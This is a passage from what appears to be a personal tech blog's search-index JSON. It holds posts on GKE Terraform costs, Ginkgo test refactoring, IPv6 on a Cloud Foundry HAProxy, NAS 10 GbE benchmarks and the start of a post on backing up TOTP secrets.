templates?\u0026rdquo;\nOur templates are $74.40 per month cheaper than Hashicorp\u0026rsquo;s. Specifically, our templates create a Zonal cluster; Hashicorp\u0026rsquo;s create a Regional cluster. A Zonal cluster qualifies for the GKE free tier:\nThe GKE free tier provides $74.40 in monthly credits per billing account that are applied to zonal and Autopilot clusters. If you only use a single Zonal or Autopilot cluster, this credit will at least cover the complete cost of that cluster each month\nBut if that\u0026rsquo;s not a good reason for you, then by all means use Hashicorp\u0026rsquo;s templates—they\u0026rsquo;re great templates!\nWe\u0026rsquo;ve made other tweaks to the templates as well, for example, we split the templates into a virtual private cloud (VPC) (vpc.tf) template and a Google Kubernetes Engine (gke) (gke.tf) template. It seemed like a good idea at the time. Also, we didn\u0026rsquo;t want to spend a lot of money, so instead of three instances in the region, we modified the template to place two instances in the same availability zone (creating a Zonal cluster).\n[e2-medium instances cost $24.46 / month in the region us-central1. We didn\u0026rsquo;t want to spend the extra $25 for a third instance.]\nFinally, we didn\u0026rsquo;t like the name of our Google Cloud project (\u0026ldquo;blabbertabber\u0026rdquo;): it was too long \u0026amp; referred to a project we had mothballed months ago. We wanted a shorter and friendlier name (\u0026ldquo;nono\u0026rdquo;), and we were loath to create a brand new Google Cloud project, so we modified the templates to include a \u0026ldquo;friendly\u0026rdquo; project name.\n","permalink":"https://blog.nono.io/post/concourse_on_k8s-1/","summary":"Let\u0026rsquo;s deploy Concourse, a continuous-integration, continuous delivery (CI/CD) application (similar to Jenkins and CircleCI).\nWe\u0026rsquo;ll deploy it to Google Cloud, to our Google Kubernetes Engine (GKE).\nIn this post, we\u0026rsquo;ll use HashiCorp\u0026rsquo;s Terraform to create our cluster.\nWe assume you\u0026rsquo;ve already installed the terraform command-line interface (CLI) and created a Google Cloud account.\nmkdir -p ~/workspace/gke cd ~/workspace/gke Next we download the terraform templates and terraform vars file:\ncurl -OL https://raw.","title":"Concourse CI on Kubernetes (GKE), Part 1: Terraform"},{"content":"Why am I creating a new blog? What was wrong with the old blog? Why don\u0026rsquo;t I use Medium?\nThe short version: The old blog is frozen in time, like a prince caught in amber 1 or a dandy in aspic 2. I can no longer post to it.\nThe old blog, the Pivotal Engineering Journal, which many of Pivotal\u0026rsquo;s engineers contributed to, was archived a year after VMware acquired Pivotal. Every acquisition brings changes, and this was, in the scheme of things, a very minor one. At least VMware kept the blog instead of simply discarding it.\nDozens of my blog posts, representing hundreds of hours of work, are now tucked away in an even smaller corner of the internet. That\u0026rsquo;s okay: technical posts have a short shelf life. They have served their purpose.\nBut I cannot lay the fault at the feet of the VMware acquisition; I, too, had a part: My interest in blogging had waned, my output, diminished. In times past I had blogged as frequently as every two months, but then slowed to a crawl: once every six months, and now it has been over a year since I wrote a technical blog post.\nThen the wind shifted, and I again felt the urge to write. Perhaps a VMware corporate blog? Maybe not. I wasn\u0026rsquo;t sure if they\u0026rsquo;d be hands-off, allowing me to choose my topics, express my opinions.\nPerhaps Medium? I discounted that, too, for I find the experience of reading articles on Medium unpleasant, especially the plaintive warning that accompanies every post: \u0026ldquo;You have 2 free member-only stories left this month. Upgrade for unlimited access.\u0026rdquo; I wanted my readers to have unfettered access to my writing.\nFinally, I like writing in Markdown using Neovim: less mouse, more keyboard.\nThe winner? A combination of Hugo and GitHub Pages.\n","permalink":"https://blog.nono.io/post/why_new_blog/","summary":"Why am I creating a new blog? What was wrong with the old blog? Why don\u0026rsquo;t I use Medium?\nThe short version: The old blog is frozen in time, like a prince caught in amber 1 or a dandy in aspic 2. I can no longer post to it.\nThe old blog, the Pivotal Engineering Journal, which many of Pivotal\u0026rsquo;s engineers contributed to, was archived a year after VMware acquired Pivotal.","title":"The Old Blog is Dead. Long Live the New Blog!"},{"content":"My co-worker Belinda Liu turned to me and said, \u0026ldquo;I don\u0026rsquo;t like these tests at all; they\u0026rsquo;re hard to follow, and I\u0026rsquo;m not sure what they\u0026rsquo;re testing.\u0026rdquo;\nI looked at the tests that I had spent much of yesterday afternoon working on. She was right: they were hard to follow (even for me, who had written some of them!).\nHow had we gotten here? Our code was straightforward, but our tests were byzantine (excessively complicated). We identified two problems:\nthe tests didn\u0026rsquo;t line up with the code the tests were deeply nested, but the code wasn\u0026rsquo;t. 1. Lining Up the Tests with the Code Belinda and I work on Cloud Foundry\u0026rsquo;s command line interface (CLI), a Golang-based utility which allows end users to interact with Cloud Foundry (e.g. to push an application). We write our tests with Ginkgo, a BDD-style Golang testing framework.\nIn this post we\u0026rsquo;ll explore a typical subcommand, stage, and its corresponding unit tests to determine how well the code lines up with our tests (hint: it doesn\u0026rsquo;t).\nIn the screenshot below, the code for the stage subcommand is on the left. On the right is a minimap of the subcommand\u0026rsquo;s Ginkgo test code. (we use a minimap rather than the complete Ginkgo code because, at 300+ lines, the tests aren\u0026rsquo;t easy to digest). The pink arrows show where a particular line of code is tested. We\u0026rsquo;re off to a good start (the first error condition is the first test), but we rapidly spiral into chaos. There seems to be no rhyme or reason why a particular test appears in a particular spot.\nThis disorganization exacts a cost: the tests are hard to follow, and coverage is difficult to determine.\nThe code is to the left, and the tests are to the right. Note that the tests are much too large (\u0026gt;300 lines) to fit in the image, so we use a minimap. The pink arrows indicate where in the test file that particular line of code is tested.\nAfter refactoring the test, the pink arrows are organized (see image below).\nKeen-eyed viewers may notice that our code has grown (it has; we added a feature, stage should not require a package). Our test refactor was opportunistic, a drive-by: we were in the codebase adding a feature, and we took an extra quarter-hour to refactor/reorganize our tests.\nThe code is to the left, and the tests are to the right. Note that the tests are much too large (\u0026gt;300 lines) to fit in the image, so we use a minimap. The pink arrows indicate where in the test file that particular line of code is tested.\nLack of code coverage is much easier to identify when the tests are patterned after the code. In fact, while writing this post, I realized that we had no test coverage for the GetNewestReadyPackageForApplication() error path. Prior to the refactor, it would have gone unnoticed.\n2. Un-Nesting the Tests The tests were nested more deeply than the code, as we found out by running egrep \u0026quot;When\\\\(|It\\\\(|Describe\\\\(\u0026quot; command/v7/stage_command_test.go | sed 's/$/})/'.\nBelow is the layout of our test code before the refactor. Our code was only one-level deep—our flow control statements, which were limited to if, weren\u0026rsquo;t nested. But our tests were as many as three levels deep:\nWhen(\u0026#34;checking target fails\u0026#34;, func() {}) It(\u0026#34;displays the experimental warning\u0026#34;, func() {}) It(\u0026#34;returns an error\u0026#34;, func() {}) When(\u0026#34;the user is logged in\u0026#34;, func() {}) When(\u0026#34;the logging does not error\u0026#34;, func() {}) When(\u0026#34;the staging is successful\u0026#34;, func() {}) It(\u0026#34;outputs the droplet GUID\u0026#34;, func() {}) It(\u0026#34;stages the package\u0026#34;, func() {}) It(\u0026#34;displays staging logs and their warnings\u0026#34;, func() {}) When(\u0026#34;the staging returns an error\u0026#34;, func() {}) It(\u0026#34;returns the error and displays warnings\u0026#34;, func() {}) When(\u0026#34;the logging stream has errors\u0026#34;, func() {}) It(\u0026#34;displays the errors and continues staging\u0026#34;, func() {}) When(\u0026#34;the logging returns an error due to an API error\u0026#34;, func() {}) It(\u0026#34;returns the error and displays warnings\u0026#34;, func() {}) After the refactor, we see that our test code is now two levels deep. \u0026ldquo;Why not one level deep?\u0026rdquo; you may ask. The answer is that the feature we were implementing—the reason we were modifying our code—introduced a new level in our code: it now had a nested if block. Our code now had two levels, which matches the two levels of our test.\nOur newly-refactored tests mirror our code, so much so that by looking at them we get an intuitive sense of how our code was written:\nWhen(\u0026#34;checking target fails\u0026#34;, func() {}) It(\u0026#34;displays the experimental warning\u0026#34;, func() {}) It(\u0026#34;returns an error\u0026#34;, func() {}) When(\u0026#34;the package\u0026#39;s GUID is not passed in\u0026#34;, func() {}) It(\u0026#34;grabs the most recent version\u0026#34;, func() {}) When(\u0026#34;It can\u0026#39;t get the application\u0026#39;s information\u0026#34;, func() {}) It(\u0026#34;returns an error\u0026#34;, func() {}) When(\u0026#34;the logging stream has errors\u0026#34;, func() {}) It(\u0026#34;displays the errors and continues staging\u0026#34;, func() {}) When(\u0026#34;the logging returns an error due to an API error\u0026#34;, func() {}) It(\u0026#34;returns the error and displays warnings\u0026#34;, func() {}) When(\u0026#34;the staging returns an error\u0026#34;, func() {}) It(\u0026#34;returns the error and displays warnings\u0026#34;, func() {}) It(\u0026#34;outputs the droplet GUID\u0026#34;, func() {}) It(\u0026#34;stages the package\u0026#34;, func() {}) It(\u0026#34;displays staging logs and their warnings\u0026#34;, func() {}) 3. In Practice: Every \u0026ldquo;if\u0026rdquo; Should Have a \u0026ldquo;When\u0026rdquo; Every if err != nil { should have a corresponding When(\u0026quot;XXX returns an error\u0026quot;, func() {.\nBelow is an example from the Cloud Foundry CLI bind-security-group:\nCode:\nsecurityGroup, warnings, err := cmd.Actor.GetSecurityGroup(cmd.RequiredArgs.SecurityGroupName) cmd.UI.DisplayWarnings(warnings) if err != nil { return err } Unit Test:\nIt(\u0026#34;gets the security group information\u0026#34;, func() { Expect(fakeActor.GetSecurityGroupCallCount).To(Equal(1)) securityGroupName := fakeActor.GetSecurityGroupArgsForCall(0) Expect(securityGroupName).To(Equal(cmd.RequiredArgs.SecurityGroupName)) }) It(\u0026#34;displays the warnings\u0026#34;, func() { Expect(testUI.Err).To(Say(getSecurityGroupWarning[0])) }) When(\u0026#34;an error is encountered getting the provided security group\u0026#34;, func() { var expectedErr error BeforeEach(func() { expectedErr = errors.New(\u0026#34;get security group error\u0026#34;) fakeActor.GetSecurityGroupReturns( resources.SecurityGroup{}, v7action.Warnings{\u0026#34;get security group warning\u0026#34;}, expectedErr) }) It(\u0026#34;returns the error and displays all warnings\u0026#34;, func() { Expect(executeErr).To(MatchError(expectedErr)) }) }) Takeaways It\u0026rsquo;s easier to navigate the tests when they\u0026rsquo;re patterned after the code. Much easier.\nRefactoring the unit tests can be done opportunistically. Sure, one can choose to do a grand refactor of the entire suite of unit tests, but that\u0026rsquo;s not always an option, and the ability to do these refactors piecemeal, when you\u0026rsquo;re modifying the code in question, is a definite advantage.\nRefactoring a test is not time consuming, and can be done in as few as fifteen minutes.\nReferences Code: Align the happy path to the left edge, Mat Ryer, August, 2016\nPractical Go: Real world advice for writing maintainable Go programs, Section 4.3 Return early rather than nesting deeply, Dave Cheney, April, 2019\nThe title, Flow Your Code Like Your Tests, is an homage to Philip K. Dick\u0026rsquo;s novel, Flow My Tears, the Policeman Said. The title is one of the few examples in the English language where the verb \u0026ldquo;flow\u0026rdquo; is used in the imperative mood.\nAcknowledgements Belinda Liu: inspiration, suggestions \u0026amp; edits; Mona Mohebbi: code samples.\nCorrections \u0026amp; Updates 2020-04-02\nWe include a snippet of code with its corresponding test.\n","permalink":"https://blog.nono.io/post/go-flow-tests-like-code/","summary":"My co-worker Belinda Liu turned to me and said, \u0026ldquo;I don\u0026rsquo;t like these tests at all; they\u0026rsquo;re hard to follow, and I\u0026rsquo;m not sure what they\u0026rsquo;re testing.\u0026rdquo;\nI looked at the tests that I had spent much of yesterday afternoon working on. She was right: they were hard to follow (even for me, who had written some of them!).\nHow had we gotten here? Our code was straightforward, but our tests were byzantine (excessively complicated).","title":"Flow Your Tests Like Your Code"},{"content":"0. Abstract HAProxy is an optional load balancer included in the canonical open source Cloud Foundry deployment. Its intended use is on IaaSes (Infrastructures as a Service) that do not offer built-in load balancers [0]. On vSphere, this means without the optional network virtualization solutions, NSX-T and NSX-V. This blog post describes how to assign an IPv6 address to an HAProxy load balancer in a Cloud Foundry deployment.\n1. Pre-requisites Users following this blog post should be familiar with BOSH, BOSH\u0026rsquo;s manifest operations files, IPv6, and deploying Cloud Foundry using cf-deployment.\n2. Set Up DNS Records We set up our DNS (Domain Name System) records as shown in the table below (we\u0026rsquo;re using the same domain, cf.nono.io, for both system and app domains, and this is probably not a good idea):\nHostname IPv4 Address IPv6 Address cf.nono.io 10.0.250.10 2601:646:100:69f5::10 *.cf.nono.io 10.0.250.10 2601:646:100:69f5::10 Our DNS server uses a BIND-format (Berkeley Internet Name Domain) [1] file, and here are the raw entries (tweaked for readability):\ncf.nono.io. A 10.0.250.10 AAAA 2601:646:100:69f5::10 *.cf.nono.io. A 10.0.250.10 AAAA 2601:646:100:69f5::10 Note that the IPv4 address (10.0.250.10) is in a private network and not reachable from the internet, but the IPv6 address (2601:646:100:69f5::10) is in a public one. Indeed, the IPv6 address is in a /64 subnet, one of 8 subnets that Comcast has allocated.\nOnly IPv6-enabled clients can reach our Cloud Foundry; IPv4-only clients can\u0026rsquo;t.\n3. Prepare the Cloud Foundry Deployment Let\u0026rsquo;s download what we need and log in to our BOSH Director:\nmkdir -p ~/workspace cd ~/workspace git clone https://github.com/cloudfoundry/cf-deployment git clone https://github.com/cunnie/deployments git clone https://github.com/cloudfoundry/cf-acceptance-tests.git export BOSH_ENVIRONMENT=vsphere # our vSphere BOSH Director\u0026#39;s environment alias bosh login cd deployments the GitHub repo cf-deployment contains the BOSH manifest and manifest operations files to deploy Cloud Foundry. the GitHub repo deployments contains additional scripts and manifest operations files to deploy Cloud Foundry with an IPv6 HAProxy. the GitHub repo cf-acceptance-tests contains a sample CF app that we can push to test IPv6 connectivity. 3.0 Prepare the BOSH Cloud Config Normally we\u0026rsquo;d add our IPv6 Network to our Cloud Config\u0026rsquo;s YAML file and then type in bosh update-cloud-config, but that\u0026rsquo;s not what we\u0026rsquo;re going to do in this case. Instead, we\u0026rsquo;re going to use the Cloud Config included cf-deployment and use a custom manifest operations files to add our IPv6 network to it.\nHere are the relevant lines from our script:\n# We don\u0026#39;t use the primary cloud config (we already have one); instead, # we set up a secondary config bosh update-config \\ --non-interactive \\ --type cloud \\ --name cf \\ \u0026lt;(bosh int \\ -o $DEPLOYMENTS_DIR/cf/cloud-config-operations.yml \\ -l $DEPLOYMENTS_DIR/cf/cloud-config-vars.yml \\ $DEPLOYMENTS_DIR/../cf-deployment/iaas-support/vsphere/cloud-config.yml) The environment variable $DEPLOYMENTS_DIR refers to the directory which contains our customizations (~/workspace/deployments).\nLet\u0026rsquo;s talk about our customizations; We customize as follows:\nWe set up our variables in cf/cloud-config-vars.yml. The file is uninteresting—it sets up the IPv4 subnets for the three AZs, two of which (az2 and az3) will be immediately removed as part of our manifest operations.\nWe apply our manifest operations (cf/cloud-config-operations.yml).\nWe remove two of the AZs, leaving one, az1. We don\u0026rsquo;t want a sprawling deployment; Our vSphere cluster is too small. We can only fit one AZ.\nWe modify az1\u0026rsquo;s\u0026rsquo; subnet to include a static IP address, 10.0.250.10, which will be assigned to the HAproxy, and which is the DNS A record for *.cf.nono.io.\nWe introduce the IPv6 subnet, 2601:646\\💯69f5::/64, including a static IPv6 address, 2601:646\\💯69f5::10, which will be assigned to the HAproxy, and which is the DNS AAAA record for *.cf.nono.io.\n3.1 Prepare the BOSH Runtime Config As long as BOSH DNS is colocated on all deployed VMs (which is the default BOSH Runtime Config), you shouldn\u0026rsquo;t need to make changes.\n3.2 Deploy Cloud Foundry with BOSH Deploying the VMs requires one command, bosh deploy, but with many options. Here are the relevant lines from our deploy shell script.\nbosh \\ -e vsphere \\ -d cf \\ deploy \\ --no-redact \\ $DEPLOYMENTS_DIR/../cf-deployment/cf-deployment.yml \\ -l \u0026lt;(lpass show --note cf.yml) \\ -v system_domain=cf.nono.io \\ -o $DEPLOYMENTS_DIR/../cf-deployment/operations/scale-to-one-az.yml \\ -o $DEPLOYMENTS_DIR/../cf-deployment/operations/use-haproxy.yml \\ -o $DEPLOYMENTS_DIR/../cf-deployment/operations/use-latest-stemcell.yml \\ -o $DEPLOYMENTS_DIR/cf/letsencrypt.yml \\ -o $DEPLOYMENTS_DIR/cf/haproxy-on-ipv6.yml \\ -v haproxy_private_ip=10.0.250.10 \\ --var-file=star_cf_nono_io_crt=$HOME/.acme.sh/\\*.cf.nono.io/fullchain.cer \\ --var-file=star_cf_nono_io_key=$HOME/.acme.sh/\\*.cf.nono.io/\\*.cf.nono.io.key \\ Notes:\n-o $DEPLOYMENTS_DIR/cf/haproxy-on-ipv6.yml is the most important line for deploying HAProxy with IPv6. It\u0026rsquo;s a BOSH manifest operations file, and will be covered in the following section.\n-v haproxy_private_ip=10.0.250.10 sets the HAProxy to the IPv4 address pointed to by *.cf.nono.io.\n-v system_domain=cf.nono.io sets the system domain, which should point to the IPv4 address above.\n\u0026lt;(lpass show --note cf.yml) is a YAML file that sets only one property, cf_admin_password. The author prefers to have a easy-to-remember admin password rather than needing to extract the password from a BOSH-generated CredHub secret. This line, this YAML file, is unnecessary; you may safely skip it.\nAny parameter beginning with $DEPLOYMENTS_DIR/../cf-deployment refers to a file in cf-deployment GitHub repo, which means it\u0026rsquo;s a canonical manifest or manifest operations file.\n-o $DEPLOYMENTS_DIR/../cf-deployment/operations/use-haproxy.yml. Enable HAProxy, otherwise there\u0026rsquo;s no VM to which we can assign an IPv6 address.\n-o $DEPLOYMENTS_DIR/cf/letsencrypt.yml is a custom manifest operations file the deploys HAProxy with a valid, commercial TLS certificate issued by Let\u0026rsquo;s Encrypt. Its usage outside the scope of this document, but if enough are interested the author may write a blog post to describe how to deploy Cloud Foundry with a free Let\u0026rsquo;s Encrypt wildcard certificate. You may safely skip this file.\n--var-file=star_cf_nono_io_crt and --var-file=star_cf_nono_io_key are also related to the Let\u0026rsquo;s Encrypt TLS certificate. You may skip them.\n4. Prepare the Manifest Operations File to Enable IPv6 on HAProxy The 23-line manifest operations file is too long to inline in this blog post, but let\u0026rsquo;s review key points:\nAssign HAProxy VM an IPv6 address. BOSH requires IPv6 to have leading zeros, no double-colons. In other words, don\u0026rsquo;t abbreviate the IPv6 address. This IPv6 address should be the AAAA DNS record of the app \u0026amp; system domains (e.g. cf.nono.io, *.cf.nono.io): # haproxy has an IPv6 address - type: replace path: /instance_groups/name=haproxy/networks/name=PAS-IPv6? value: name: PAS-IPv6 static_ips: - 2601:0646:0100:69f5:0000:0000:0000:0010 Configure HAProxy job (process) to bind to both IPv4 and IPv6 addresses: # configure haproxy to bind to the IPv6 in6addr_any address \u0026#34;::\u0026#34; - type: replace path: /instance_groups/name=haproxy/jobs/name=haproxy/properties/ha_proxy/binding_ip? value: \u0026#34;::\u0026#34; # configure haproxy to bind to both IPv4 \u0026amp; IPv6 interfaces - type: replace path: /instance_groups/name=haproxy/jobs/name=haproxy/properties/ha_proxy/v4v6? value: true 5. Test We push an application, then curl the application over IPv6.\ncf api api.cf.nono.io --skip-ssl-validation # replace your CF API endpoint here cf login cf target -o system -s system # or whichever org \u0026amp; space you want to use cf push dora -p ../cf-acceptance-tests/assets/dora curl -6 -k https://dora.cf.nono.io # replace your application domain here # \u0026#34;Hi, I\u0026#39;m Dora!\u0026#34; Gotchas A reasonable question is, \u0026ldquo;do browsers have trouble consistently navigating to HAProxy\u0026rsquo;s IPv6 address given that *.cf.nono.io resolve to both IPv4 and IPv6 addresses?\u0026rdquo;\nWe haven\u0026rsquo;t experienced trouble with either the Google Chrome or Firefox browsers. Similarly, we haven\u0026rsquo;t experienced problems with the Cloud Foundry CLI (Command Line Interface); however, we suspect that if we had a machine on our internal network whose IPv4 addressed matched the IPv4 address of our HAProxy (i.e. 10.0.250.10), then connectivity would be erratic.\nAssigning the HAProxy VM\u0026rsquo;s default gateway to the IPv4 or IPv6 interface is a nuanced decision. If the BOSH Director is in a different IPv4 subnet, you must assign the default gateway to the IPv4 interface so that the VM can reach the BOSH director and retrieve its configuration and releases (as is the case in our setup).\nIf you have IPv6 router advertisements on your IPv6 subnet, your IPv6 interface will pick up its default gateway for free. If you do not have router advertisements, you will need a more complex manifest operations file; check here for inspiration.\nFor best results, use Ubuntu Xenial stemcells 621.51 or greater; IPv6 router advertisement are enabled by default.\nFootnotes [0]\nMost IaaSes (Amazon Web Services (AWS), Google Cloud, and Microsoft Azure) offer load balancers, and they typically charge $200+/yr for the service.\nThe author is of the opinion is that load balancers are often an unnecessary expense, and many users are better off with a carefully-monitored single webserver rather than a fleet of webservers fronted by a load balancer. To quote Andrew Carnegie:\nput all your eggs in one basket, and then watch that basket\n[1]\nBIND is an old-school DNS server. Nowadays most users are better off using DNS-as-a-service (e.g. Amazon\u0026rsquo;s Route 53, Google Cloud DNS), but for the hardcore, deploying your own DNS servers is a wonderfully addictive option. The author, for example, has been running his own DNS servers since 1996, and currently maintains 4 DNS servers on 4 different IaaSes (Azure, AWS, Google, Hetzner) on 3 different continents (America, Asia, Europe).\nThe author is an unapologetic DNS fanboy, and had Paul Mockapetris, the author of the original DNS RFC, autograph his laptop with a permanent marker.\n","permalink":"https://blog.nono.io/post/haproxy-ipv6/","summary":"0. Abstract HAProxy is an optional load balancer included in the canonical open source Cloud Foundry deployment. Its intended use is on IaaSes (Infrastructures as a Service) that do not offer built-in load balancers [0]. On vSphere, this means without the optional network virtualization solutions, NSX-T and NSX-V. This blog post describes how to assign an IPv6 address to an HAProxy load balancer in a Cloud Foundry deployment.\n1. Pre-requisites Users following this blog post should be familiar with BOSH, BOSH\u0026rsquo;s manifest operations files, IPv6, and deploying Cloud Foundry using cf-deployment.","title":"How To Enable IPv6 on Your Cloud Foundry's HAProxy"},{"content":"Abstract \u0026ldquo;How much faster will my VM\u0026rsquo;s disks be if I upgrade my ZFS-based (Z File System) NAS to 10 GbE?\u0026rdquo; The disks will be faster, in some cases, much faster. Our experience is that sequential read throughput will be 1.4✕ faster, write throughput, 10✕ faster, and IOPS, 1.6✕ faster.\nWe ran a three-hour benchmark on our NAS server before and after upgrading to 10 GbE. We ran the benchmark again after upgrading. The benchmark looped through write-read-iops tests continuously.\nThe Sequential Read Results: We were underwhelmed with the 10 GbE read performance — we felt it should have been better, and surprised that it wasn\u0026rsquo;t. The 1 GbE results were close to the theoretical network maximum, and we thought the upgrade would have unleashed its full potential. Little did we know that its full potential was barely above 1 GbE.\nThe lackluster performance wasn\u0026rsquo;t due to RAM pressure: there was enough RAM on the FreeNAS server (128 GiB) to cache the contents of the sequential read test (16 GiB) several times over, and this was borne out by running zpool iostat 5, which showed the disks were barely touched during the read test.\nWe also noticed dips in 10 GbE performance at regular intervals (where the read throughput dropped to less than 120 MB/sec); we are not sure what caused these dips, but they seemed to occur almost exactly 35 minutes apart (although timestamps aren\u0026rsquo;t included in the graph above, they are included in the raw benchmark results, which can be viewed in the References section below).\nAs an aside, there are fewer 1 GbE tests than 10 GbE tests in the above chart. That is, there are fewer blue dots than red dots, for the 1 GbE tests took longer to run, hence there were fewer results reported within the three-hour test window.\nThe Sequential Write Results: The sequential write performance, shown in the above graph, was the star of the show: a 10✕ increase, linear with the network bandwidth increase.\nThere are some caveats. Most importantly, we sacrificed safety for speed. Specifically, we did not override the default ZFS setting, sync=standard. As pointed out in the article, \u0026ldquo;Sync writes, or: Why is my ESXi NFS so slow, and why is iSCSI faster?\u0026rdquo;:\niSCSI by default does not implement sync writes. As such, it often appears to users to be much faster\u0026hellip;. However, your VM data is being written async, which is hazardous to your VM\nYou may ask, \u0026ldquo;What are these sync writes to which you refer?\u0026rdquo; Robert Milkowski, the author of the ZFS sync feature, describes it succinctly in his blog post:\nSynchronous file system transactions (fsync, O_DSYNC, O_SYNC, etc) are written out [to disk before returning from the system call]\nIn other words, these are system calls (fsync(2)) or flags to system calls ( open(2)\u0026rsquo;s \u0026lsquo;O_DSYNC and O_SYNC) to make sure that the data has really, truly been written out to disk before returning from a write(2). When the system call returns, you know that the data\u0026rsquo;s on the disk, not in some buffer somewhere.\n[Editor\u0026rsquo;s note: this is not always true. Linux usually writes the data to disk, but sometimes it doesn\u0026rsquo;t. For the dirty details, see this post.]\nsync is a great feature when ZFS is used as a fileserver (technically a distributed file system), via protocols such as NFS (Network File System), SMB (Server Message Block), or even the deprecated AFP (Apple Filing Protocol, formerly AppleTalk Filing Protocol):\nThe applications that depend on synchronous behavior (that have opted-in via system call or flag) are guaranteed that their data has been written to disk The majority of applications who don\u0026rsquo;t need synchronous behavior can take advantage of the high write speeds (often ten times as fast) But here\u0026rsquo;s the rub: iSCSI is not a distributed file system. It\u0026rsquo;s a distributed block device. Which means it\u0026rsquo;s at a lower layer than NFS, SMB, and AFP. There are no system calls, no directories, no file permissions, no files; there are only reads and writes.\nThe upshot is that if power is cut to the NAS server while the VM is active, the and the NAS hasn\u0026rsquo;t yet flushed the outstanding writes to disk, then the VM\u0026rsquo;s file system may be corrupted beyond the ability of file system repair tools to fix. We witnessed this problem firsthand by cutting the power to the NAS server while actively exercising a Linux VM\u0026rsquo;s iSCSI disk by running the gobonniego file system benchmark. Our Linux system\u0026rsquo;s btrfs filesystem was corrupted beyond the ability of btrfsck to fix, emitting cryptic errors such as \u0026ldquo;child eb corrupted\u0026rdquo; and \u0026ldquo;parent transid verify failed\u0026rdquo; before finally giving up. We lost our VM, and had to reinstall Linux from scratch.\nThe IOPS Results: The IOPS results were good, averaging 21k. As a comparison, they were much better than a mechanical hard drive\u0026rsquo;s (44 -203), and better than even SATA 3 Gbit/s\u0026rsquo;s 5k-20k, but nowhere near as performant as the higher end NVMe drives (e.g. Samsung SSD 960 PRO\u0026rsquo;s 360k).\nConfiguration Storage Component 10 GbE\n(new, 2019) 1 GbE\n(old, 2104) Motherboard $820 1 × Supermicro X10SDV-8C-TLN4F+ Mini-ITX 1.7GHz 35W 8-Core Intel Xeon D-1537 $375 1 × Supermicro A1SAi-2750F Mini-ITX 2.4GHz 20W 8-Core Intel C2750 Ethernet controller (built-in) (built-in) RAM $1,336 4 × D760R Samsung DDR4-2666 32GB ECC Registered $372 4 × Kingston KVR13LSE9/8 8GB ECC SODIMM HBA (same HBA) $238 1 × LSI SAS 9211-8i 6Gb/s SAS Host Bus Adapter Disk (same Disk) $1,190 7 × Seagate 4TB NAS HDD ST4000VN000 Power Supply (same Power Supply) $110 1 × Corsair HX650 650 watt power supply Ethernet Switch $589 1 × QNAP QSW-1208-8C 12-port 10GbE unmanaged switch $18 1 × TP-Link 8-Port Gigabit Desktop Switch TLSG1008D SFP+ Modules $79 2 × Ubiquiti UF-MM-10G U Fiber SFP+ Module 2-pack N/A Software (same Software) FreeNAS-11.2-U4.1 Virtual Machine: Hypervisor: VMware ESXi, 6.7.0, 13644319 Underlying hardware: (same as file server\u0026rsquo;s): Supermicro X10SDV-8C-TLN4F+ Mini-ITX 1.7GHz 35W 8-Core Intel Xeon D-1537 vCPUs: 8 RAM: 8 GiB OS: Fedora 30 (Server Edition) Linux kernel: 5.0.16-300.fc30.x86_64 Filesystem: tmpfs (not ext4 nor btrfs) Benchmarking Software: GoBonnieGo v1.0.9 Benchmarking invocation: ./gobonniego -dir /tmp/ -json -seconds 14400 -v -iops-duration 60 Shortcomings We didn\u0026rsquo;t control solely for the 1 GbE → 10 GbE differences: the ethernet controllers were built into the motherboards, hence the ethernet controller upgrade entailed a motherboard upgrade in turn entailing CPU \u0026amp; RAM upgrades.\nIn other words, the performance increases can\u0026rsquo;t be attributed solely to the change in network controllers; faster CPUs and larger (32 GiB → 128 GiB) and faster (DDR3 → DDR4) RAM may also have been a factor.\nWe have seen at least one dramatic speed-up that we could not attribute to the ethernet upgrade: when browsing an AFP (Apple Filing Protocol) share from our WiFi-based laptop, we noticed that one large directory (4.5k entries), which previously took ~30 seconds to display in Apple\u0026rsquo;s Finder, now displayed in sub-second time. We know the WiFi\u0026rsquo;s throughput (200 Mb/s) was minuscule compared to the file server\u0026rsquo;s (1 Gb/s, 10 Gb/s), so the reason for the speed-up lay elsewhere.\nOther VMs had disks that were placed on the iSCSI datastore; they may have contended with benchmark VM for disk access. We feel the contention was minor at most.\nReferences Raw benchmark results: 1 GbE 10 GbE ZFS configuration: zdb -eC tank zfs get all tank/vSphere zpool status tank A High-performing Mid-range NAS Server, Part 1: Initial Set-up and Testing A High-performing Mid-range NAS Server, Part 2: Performance Tuning for iSCSI ","permalink":"https://blog.nono.io/post/nas-performance-tuning/","summary":"Abstract \u0026ldquo;How much faster will my VM\u0026rsquo;s disks be if I upgrade my ZFS-based (Z File System) NAS to 10 GbE?\u0026rdquo; The disks will be faster, in some cases, much faster. Our experience is that sequential read throughput will be 1.4✕ faster, write throughput, 10✕ faster, and IOPS, 1.6✕ faster.\nWe ran a three-hour benchmark on our NAS server before and after upgrading to 10 GbE. We ran the benchmark again after upgrading.","title":"A High-performing Mid-range NAS Server, Part 3: 10 GbE"},{"content":"Abstract Smartphone authenticator apps such as Google Authenticator and Authy implement software tokens that are \u0026ldquo;two-step verification services using the Time-based One-time Password Algorithm (TOTP) and HMAC-based One-time Password algorithm (HOTP)\u0026rdquo;\nSmartphone TOTP, a form of Two-factor authentication (2FA), displays a 6-digit code derived from a shared secret, updating every thirty seconds.\nThe shared secret is presented only once to the user, typically with a QR (Quick Response) Code which is scanned by the authenticator app.\nBy using a simple QR app (not an authenticator app) to read in the shared secret, and storing the shared secret in a secure manner, one can easily recover the state of the authenticator app on a replacement phone.\nThe Google Authenticator app running on an Android phone displaying the TOTP codes for several services, including Okta (shown), GitHub, and LastPass This procedure is designed for an Android phone and a macOS workstation, but can be adapted to an iOS phone or Linux workstation, and, with some work, to a Windows workstation.\nProcedure The process described here is not lightweight—it\u0026rsquo;s as burdensome as resetting all your TOTP secrets. The target user is someone who prefers TOTP 2FA over SMS 2FA and who frequently upgrades phones (or factory resets them). Or someone who keeps spare phones.\n0. Scan in the QR URL When scanning in a new TOTP code, rather than launching Google Authenticator, we use Android Camera\u0026rsquo;s builtin QR Code reader (we\u0026rsquo;re not familiar with iOS/iPhones, but we assume there is an equivalent feature):\nThe Android Camera has a QR code reader mini-app. The launch button (see arrow) displays when the camera recognizes a QR code The gentle reader should rest assured that all secrets in this blog post are fakes and that we would not deliberately leak our TOTP secrets in such an indiscreet manner.\nOnce in the QR mini-app, we copy the link to the clipboard by pressing the \u0026ldquo;duplicate\u0026rdquo; icon. A typical link would be similar to the following (an example TOTP from Slack):\notpauth://totp/Slack (Cloud 